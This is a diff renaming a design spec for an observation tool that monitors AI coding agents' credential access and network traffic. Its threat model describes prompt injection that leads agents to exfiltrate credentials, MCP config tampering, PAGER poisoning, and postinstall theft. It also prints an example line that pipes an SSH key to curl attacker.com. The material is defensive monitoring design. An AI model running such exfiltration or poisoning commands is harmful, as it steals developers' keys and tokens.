@@ -1,4 +1,4 @@
-# AgentFence — Original Design Spec
+# Fishbowl — Original Design Spec
 
 > **Historical document.** This was the original design specification written before implementation. The actual implementation diverges significantly: blocking/enforcement was deliberately removed, the project is observation-only, Windows support was never built, and the file/directory layout doesn't match. **For current documentation, see [README.md](../README.md).** This file is preserved as a design reference for the threat model and architectural intent.
 
@@ -13,13 +13,13 @@ AI coding agents operate with developer-level privileges. They read your SSH key
 - **Supply chain attacks** through compromised npm/pip packages can steal credentials from child processes that inherit the full environment.
 - **MCP config tampering** can swap trusted tool servers for malicious ones without re-prompting the user.
 
-No existing tool addresses this at the developer workstation layer with credential-awareness and AI-agent context. Enterprise tools (Straiker, CrowdStrike AIDR) work at the organizational layer. Infrastructure tools (Tetragon, Falco) work at the Kubernetes layer. Proxy tools (MintMCP) work at the MCP layer. **AgentFence works where you work — on your machine, around your credentials, watching your agent.**
+No existing tool addresses this at the developer workstation layer with credential-awareness and AI-agent context. Enterprise tools (Straiker, CrowdStrike AIDR) work at the organizational layer. Infrastructure tools (Tetragon, Falco) work at the Kubernetes layer. Proxy tools (MintMCP) work at the MCP layer. **Fishbowl works where you work — on your machine, around your credentials, watching your agent.**
 
 ---
 
 ## Core Concept
 
-AgentFence is not an isolation cage that hides credentials from the agent. The agent still needs to use SSH keys, API tokens, and cloud credentials to do its job. Instead, **the container is the execution boundary and the host is the observation point**. The container constrains what the agent can reach; host-side telemetry verifies what actually happened across that boundary.
+Fishbowl is not an isolation cage that hides credentials from the agent. The agent still needs to use SSH keys, API tokens, and cloud credentials to do its job. Instead, **the container is the execution boundary and the host is the observation point**. The container constrains what the agent can reach; host-side telemetry verifies what actually happened across that boundary.
 
 Credentials are mounted into the container, but because you control the runtime boundary, you get:
 
@@ -39,7 +39,7 @@ In the current prototype, some telemetry still runs inside the container. That i
 │  HOST                                                           │
 │                                                                 │
 │  ┌──────────────────────┐    ┌──────────────────────────────┐   │
-│  │  AgentFence Daemon   │    │  Credential Registry (Live)  │   │
+│  │  Fishbowl Daemon   │    │  Credential Registry (Live)  │   │
 │  │                      │◄──►│                              │   │
 │  │  - Container mgmt    │    │  - Auto-discovered creds     │   │
 │  │  - Host-side scans   │    │  - Classifications           │   │
@@ -50,7 +50,7 @@ In the current prototype, some telemetry still runs inside the container. That i
 │             │  Docker API                                       │
 │             ▼                                                   │
 │  ┌──────────────────────────────────────────────────────────┐   │
-│  │  AGENTFENCE CONTAINER                                    │   │
+│  │  FISHBOWL CONTAINER                                    │   │
 │  │                                                          │   │
 │  │  ┌────────────────────────────────────────────────────┐  │   │
 │  │  │  AI Coding Agent (Codex / Claude Code)              │  │   │
@@ -83,7 +83,7 @@ In the current prototype, some telemetry still runs inside the container. That i
 │                             │  Structured logs via volume mount │
 │                             ▼                                   │
 │                 ┌───────────────────────┐                       │
-│                 │  AgentFence Dashboard │                       │
+│                 │  Fishbowl Dashboard │                       │
 │                 │  / CLI / Log Output   │                       │
 │                 └───────────────────────┘                       │
 └─────────────────────────────────────────────────────────────────┘
@@ -162,11 +162,11 @@ The registry is a live, structured inventory that grows organically as you work:
 }
 ```
 
-No config file to maintain. No upfront setup beyond launching AgentFence with your project. The only optional interaction is tuning — telling it "this high-entropy string is not a secret, ignore it" to reduce false positives.
+No config file to maintain. No upfront setup beyond launching Fishbowl with your project. The only optional interaction is tuning — telling it "this high-entropy string is not a secret, ignore it" to reduce false positives.
 
 #### Detection Patterns
 
-AgentFence ships with TruffleHog-compatible detector patterns covering hundreds of credential types:
+Fishbowl ships with TruffleHog-compatible detector patterns covering hundreds of credential types:
 
 - Cloud providers: AWS access keys, GCP service account keys, Azure client secrets, DigitalOcean tokens
 - SaaS platforms: Slack tokens, GitHub PATs, GitLab tokens, Stripe keys, Twilio credentials
@@ -185,19 +185,19 @@ The container is the security boundary. It provides the controlled environment w
 #### Container Launch
 
 ```bash
-# Basic launch — AgentFence discovers everything automatically
-agentfence run --project ~/projects/my-app
+# Basic launch — Fishbowl discovers everything automatically
+fishbowl run --project ~/projects/my-app
 
 # Launch with a specific AI agent
-agentfence run --project ~/projects/my-app --agent claude-code
+fishbowl run --project ~/projects/my-app --agent claude-code
 
 # Launch with pre-seeded credentials from the host
-agentfence run ~/projects/my-app --mount ~/.ssh/lab_key --mount SPLUNK_HEC_TOKEN
+fishbowl run ~/projects/my-app --mount ~/.ssh/lab_key --mount SPLUNK_HEC_TOKEN
 ```
 
-On launch, AgentFence:
+On launch, Fishbowl:
 
-1. Builds/pulls the AgentFence container image (based on a standard dev image with monitoring baked in)
+1. Builds/pulls the Fishbowl container image (based on a standard dev image with monitoring baked in)
 2. Bind-mounts the project directory read-write at `/workspace`
 3. Mounts any explicitly specified credential files as read-only
 4. Injects any explicitly specified env vars
@@ -209,7 +209,7 @@ In the current implementation, host-side eBPF collectors are optional and experi
 
 #### Container Image
 
-The AgentFence base image includes:
+The Fishbowl base image includes:
 
 - Standard development toolchain (git, python, node, common build tools)
 - The three watchers (filesystem, environment, network)
@@ -228,7 +228,7 @@ The image is fully auditable and reproducible. Users can extend it with custom t
 | Project directory | `/workspace` | read-write | Active development |
 | Specified SSH keys | `/workspace/.ssh/<name>` | read-only | SSH access to defined hosts |
 | Specified cred files | `/workspace/.creds/<name>` | read-only | Explicit credential files |
-| Audit log volume | `/var/log/agentfence` | read-write | Logs exported to host |
+| Audit log volume | `/var/log/fishbowl` | read-write | Logs exported to host |
 
 Critically, the container does **not** mount:
 
@@ -294,7 +294,7 @@ Monitors the shell environment for credential-related activity.
 
 **Shell hook mechanism:**
 
-AgentFence wraps the container's shell with a precmd/preexec hook (zsh) or PROMPT_COMMAND/trap DEBUG (bash) that intercepts commands before execution. This captures:
+Fishbowl wraps the container's shell with a precmd/preexec hook (zsh) or PROMPT_COMMAND/trap DEBUG (bash) that intercepts commands before execution. This captures:
 
 - `export VAR=value` — new environment variable set
 - `declare`/`typeset` — variable declarations (the CVE-2026-22708 vector)
@@ -342,7 +342,7 @@ Monitors all outbound network connections from the container.
 
 **Network telemetry:**
 
-AgentFence currently observes and classifies outbound traffic from the container. It does not block connections. The current model is:
+Fishbowl currently observes and classifies outbound traffic from the container. It does not block connections. The current model is:
 
 - Outbound traffic is logged with process context
 - Expected destinations are learned over time from observed credential use
@@ -416,7 +416,7 @@ The engine uses the process tree to assign a trust score to each access event. D
 
 #### Audit Log Format
 
-All events are written as structured JSON to `/var/log/agentfence/audit.jsonl`, mounted out to the host for persistence across sessions. Each line is a self-contained event with full context for forensic analysis.
+All events are written as structured JSON to `/var/log/fishbowl/audit.jsonl`, mounted out to the host for persistence across sessions. Each line is a self-contained event with full context for forensic analysis.
 
 ---
 
@@ -438,31 +438,31 @@ This scanner runs in the host's native environment (no Docker needed) and output
 
 ## Threat Coverage
 
-AgentFence is designed to defend against the following documented attack patterns. The CVEs cited below were originally reported against Cursor; they're listed because they motivate the threat model — the same attack classes apply to any AI coding agent that inherits the developer's environment. **AgentFence's defenses against these classes have been validated in the Codex and Claude Code wrapped-session flow only;** equivalent end-to-end validation against Cursor has not been performed.
+Fishbowl is designed to defend against the following documented attack patterns. The CVEs cited below were originally reported against Cursor; they're listed because they motivate the threat model — the same attack classes apply to any AI coding agent that inherits the developer's environment. **Fishbowl's defenses against these classes have been validated in the Codex and Claude Code wrapped-session flow only;** equivalent end-to-end validation against Cursor has not been performed.
 
 ### CVE-2026-22708 — Environment Variable Poisoning (originally reported against Cursor)
 
 **Attack:** Shell built-ins (`export`, `typeset`, `declare`) execute without user consent, poisoning variables like `PAGER`, `PYTHONWARNINGS`, `BROWSER`, `PERL5OPT` to achieve code execution when trusted commands run.
 
-**AgentFence defense:** The environment watcher detects any modification to dangerous variables immediately and generates an alert. The host's `~/.zshrc` and `~/.bashrc` are not mounted, so persistent poisoning via file write to rc files is impossible.
+**Fishbowl defense:** The environment watcher detects any modification to dangerous variables immediately and generates an alert. The host's `~/.zshrc` and `~/.bashrc` are not mounted, so persistent poisoning via file write to rc files is impossible.
 
 ### CVE-2025-54135 / CVE-2025-54136 — MCP Config Tampering (originally reported against Cursor)
 
 **Attack:** Malicious prompt injection causes the agent to create or modify MCP configuration files, adding attacker-controlled servers.
 
-**AgentFence defense:** The filesystem watcher detects writes to known MCP config paths (`.cursor/mcp.json`, `claude_desktop_config.json`) and alerts on any modification.
+**Fishbowl defense:** The filesystem watcher detects writes to known MCP config paths (`.cursor/mcp.json`, `claude_desktop_config.json`) and alerts on any modification.
 
 ### Supply Chain Credential Theft (npm/pip postinstall)
 
 **Attack:** A compromised dependency's install script reads environment variables or credential files and exfiltrates them to an external server.
 
-**AgentFence defense:** The filesystem watcher logs the access with full process tree attribution, showing the install script as the accessor. The network watcher detects credential material in outbound connections to non-expected destinations and emits high-severity alerts and correlation findings.
+**Fishbowl defense:** The filesystem watcher logs the access with full process tree attribution, showing the install script as the accessor. The network watcher detects credential material in outbound connections to non-expected destinations and emits high-severity alerts and correlation findings.
 
 ### Indirect Prompt Injection via Repos/Slack/Email
 
 **Attack:** Malicious content in a cloned repo, Slack message, or email processed by the AI agent contains instructions to exfiltrate credentials.
 
-**AgentFence defense:** Regardless of what the agent is tricked into doing, the three watchers observe the actual credential access and network activity. The agent can be instructed to `cat ~/.ssh/id_rsa | curl attacker.com`, but AgentFence sees the file read, sees the outbound connection, and alerts with the full process chain.
+**Fishbowl defense:** Regardless of what the agent is tricked into doing, the three watchers observe the actual credential access and network activity. The agent can be instructed to `cat ~/.ssh/id_rsa | curl attacker.com`, but Fishbowl sees the file read, sees the outbound connection, and alerts with the full process chain.
 
 ---
 
@@ -471,19 +471,19 @@ AgentFence is designed to defend against the following documented attack pattern
 ### First Run
 
 ```bash
-$ agentfence run --project ~/projects/splunk-app
+$ fishbowl run --project ~/projects/splunk-app
 
-[AgentFence] Starting credential discovery on host...
-[AgentFence] Found: SSH key (~/.ssh/id_ed25519)
-[AgentFence] Found: SSH key (~/.ssh/lab_key)
-[AgentFence] Found: AWS credentials (~/.aws/credentials)
-[AgentFence] Host scan complete. 3 credentials found.
+[Fishbowl] Starting credential discovery on host...
+[Fishbowl] Found: SSH key (~/.ssh/id_ed25519)
+[Fishbowl] Found: SSH key (~/.ssh/lab_key)
+[Fishbowl] Found: AWS credentials (~/.aws/credentials)
+[Fishbowl] Host scan complete. 3 credentials found.
 
-[AgentFence] Building container...
-[AgentFence] Mounting project: ~/projects/splunk-app → /workspace
-[AgentFence] No credentials explicitly mounted. Living discovery active.
-[AgentFence] Network mode: learning
-[AgentFence] Container started. Launching shell...
+[Fishbowl] Building container...
+[Fishbowl] Mounting project: ~/projects/splunk-app → /workspace
+[Fishbowl] No credentials explicitly mounted. Living discovery active.
+[Fishbowl] Network mode: learning
+[Fishbowl] Container started. Launching shell...
 
 workspace $
 ```
@@ -493,48 +493,48 @@ workspace $
 ```bash
 workspace $ echo "SPLUNK_HEC_TOKEN=abc123def456" >> .env
 
-[AgentFence] 🔍 New credential discovered in /workspace/.env
-[AgentFence]    Type: Splunk HEC Token
-[AgentFence]    Variable: SPLUNK_HEC_TOKEN
-[AgentFence]    Now tracking. Audit logging active.
+[Fishbowl] 🔍 New credential discovered in /workspace/.env
+[Fishbowl]    Type: Splunk HEC Token
+[Fishbowl]    Variable: SPLUNK_HEC_TOKEN
+[Fishbowl]    Now tracking. Audit logging active.
 
 workspace $ export SPLUNK_PASSWORD="hunter2"
 
-[AgentFence] 🔍 New credential discovered in environment
-[AgentFence]    Type: Generic password (high entropy)
-[AgentFence]    Variable: SPLUNK_PASSWORD
-[AgentFence]    Now tracking. Audit logging active.
+[Fishbowl] 🔍 New credential discovered in environment
+[Fishbowl]    Type: Generic password (high entropy)
+[Fishbowl]    Variable: SPLUNK_PASSWORD
+[Fishbowl]    Now tracking. Audit logging active.
 
 workspace $ ssh -i .ssh/lab_key user@10.0.1.50
 
-[AgentFence] ✅ Credential access: .ssh/lab_key by ssh (pid 1234)
-[AgentFence]    Destination: 10.0.1.50:22 — added to expected destinations
+[Fishbowl] ✅ Credential access: .ssh/lab_key by ssh (pid 1234)
+[Fishbowl]    Destination: 10.0.1.50:22 — added to expected destinations
 ```
 
 ### When Something Suspicious Happens
 
 ```bash
-[AgentFence] ⚠️  MEDIUM: Environment mutation detected
-[AgentFence]    Variable: PAGER
-[AgentFence]    Old value: less
-[AgentFence]    New value: /tmp/payload.sh
-[AgentFence]    Set by: export (pid 2345, parent: claude pid 2300)
-[AgentFence]    This variable is on the dangerous variables watchlist.
-[AgentFence]    Any subsequent git/man command will execute /tmp/payload.sh
+[Fishbowl] ⚠️  MEDIUM: Environment mutation detected
+[Fishbowl]    Variable: PAGER
+[Fishbowl]    Old value: less
+[Fishbowl]    New value: /tmp/payload.sh
+[Fishbowl]    Set by: export (pid 2345, parent: claude pid 2300)
+[Fishbowl]    This variable is on the dangerous variables watchlist.
+[Fishbowl]    Any subsequent git/man command will execute /tmp/payload.sh
 
-[AgentFence] 🚨 CRITICAL: Credential exfiltration attempt detected
-[AgentFence]    Credential: SSH key (cred-001)
-[AgentFence]    Process: curl (pid 3456) ← node (pid 3400) ← npm postinstall (pid 3390)
-[AgentFence]    Destination: 45.33.100.12:443 (not in expected destinations)
-[AgentFence]    Action: ALERTED
+[Fishbowl] 🚨 CRITICAL: Credential exfiltration attempt detected
+[Fishbowl]    Credential: SSH key (cred-001)
+[Fishbowl]    Process: curl (pid 3456) ← node (pid 3400) ← npm postinstall (pid 3390)
+[Fishbowl]    Destination: 45.33.100.12:443 (not in expected destinations)
+[Fishbowl]    Action: ALERTED
 ```
 
 ### Audit Review
 
 ```bash
-$ agentfence audit --last-session
+$ fishbowl audit --last-session
 
-AgentFence Audit Report — Session 2026-04-05T14:00:00Z
+Fishbowl Audit Report — Session 2026-04-05T14:00:00Z
 Duration: 2h 45m
 Agent: claude-code
 
@@ -554,7 +554,7 @@ Network Destinations: 4
   - api.github.com:443 (HTTPS) ✅
   - 45.33.100.12:443 (HTTPS) 🚨 BLOCKED
 
-Full audit log: ~/.agentfence/logs/session-2026-04-05T140000Z.jsonl
+Full audit log: ~/.fishbowl/logs/session-2026-04-05T140000Z.jsonl
 ```
 
 ---
@@ -578,7 +578,7 @@ Full audit log: ~/.agentfence/logs/session-2026-04-05T140000Z.jsonl
 ## Project Structure
 
 ```
-agentfence/
+fishbowl/
 ├── src/                        # Rust source — host CLI and daemon
 │   ├── main.rs
 │   ├── cli/                    # CLI commands (run, audit, config)
@@ -597,7 +597,7 @@ agentfence/
 │       ├── report.rs           # Session audit report generator
 │       └── live.rs             # Real-time log streaming
 ├── container/                  # Container-side components
-│   ├── Dockerfile              # AgentFence base image
+│   ├── Dockerfile              # Fishbowl base image
 │   ├── watchers/
 │   │   ├── fs_watcher.py       # Inotify-based filesystem watcher
 │   │   ├── env_watcher.sh      # Shell hook for env monitoring
@@ -650,7 +650,7 @@ agentfence/
 
 ### Phase 3 — Agent Integrations
 
-- Claude Code hooks integration (bidirectional — AgentFence informs hooks, hooks inform AgentFence)
+- Claude Code hooks integration (bidirectional — Fishbowl informs hooks, hooks inform Fishbowl)
 - End-to-end validation for additional agents (Cursor, Windsurf, Copilot — `Agent` enum branches exist but the wrapped-session flow has only been exercised for Codex and Claude Code)
 - MCP config monitoring
 - Pre-built container images with popular AI agents
@@ -667,7 +667,7 @@ agentfence/
 
 ## License
 
-AgentFence is open-source software. License TBD.
+Fishbowl is open-source software. License TBD.
 
 ---
 
